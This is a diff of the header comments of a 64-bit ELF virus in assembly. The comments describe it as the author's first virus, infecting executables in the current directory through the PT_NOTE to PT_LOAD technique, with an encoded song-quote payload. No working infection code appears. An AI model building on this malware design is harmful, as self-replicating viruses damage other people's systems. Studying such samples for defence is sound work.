@@ -2,12 +2,13 @@
 
 ; Finished on 30.05.2020
 ; Released on 07.11.2020
-; The release delay was due to the fact I was trying to code a fancy 90's style payload but due to lack of time, I'll leave this to another project.
+; The release was delayed because I was trying to code a fancy 90's style payload and due to lack of time, I'll leave this to another project.
 ; This is my first full assembly virus and it uses FASM (https://flatassembler.net).
 ;   - relies on PT_NOTE -> PT_LOAD infection technique and should work on any 64bit ELF executable (position independent or not).
 ;   - should use mmap but instead it uses pread and pwrite (I'm lazy). 
 ;   - stores stuff on memory buffer (r15 register).
-; Payload is a quote from a song and it's encoded for no reason whatsoever.
+;   - infects current directory (non recursively).
+; Payload (non destructive) is a quote from a song and it's encoded for no reason whatsoever.
 ; 
 ; A big thanks for those who keeps the VX scene alive!
 ; Feel free to email me: tmz@null.net || || tmz@syscall.sh || thomazi@linux.com
@@ -72,7 +73,6 @@ PT_LOAD         = 1
 PT_NOTE         = 4
 PF_X            = 1
 PF_R            = 4
-
 
 ; r15 + 0 = stack buffer (10000 bytes) = stat
 ; r15 + 48 = stat.st_size
